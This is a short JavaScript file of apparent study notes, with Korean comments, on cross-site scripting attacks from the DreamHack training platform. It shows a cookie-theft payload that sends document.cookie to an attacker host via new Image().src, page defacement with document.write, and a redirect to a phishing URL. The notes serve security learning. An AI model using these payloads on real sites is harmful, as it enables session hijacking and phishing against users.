// 1. 쿠키 및 세션 탈취 공격 코드

alert("hello");
// 현재 페이지의 쿠키
document.cookie;
// 현재 페이지의 쿠키를 인자로 가진 alert실행
alert(document.cookie);
// 쿠키 생성(key:name, value:test)
document.cookie = "name=test";
// 이미지 생성 함수 new Image() , src는 이미지의 주소를 지정. 공격자 수고는 http://hacker.dreamhack.io
new Image().src = "http://hacker.dreamhack.io/?cookie="+ document.cookie;
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 사용하기 때문에 공격자가 주소로 현재 페이지의 쿠키 요청



// 2. 페이지 변조 공격 코드

// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");



// 3. 위치 이동 공격 코드

// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href="http://hacker.dreamhack.io/phishing";
// 새 창 열기
window.open("http://hacker.dreamhack.io/")

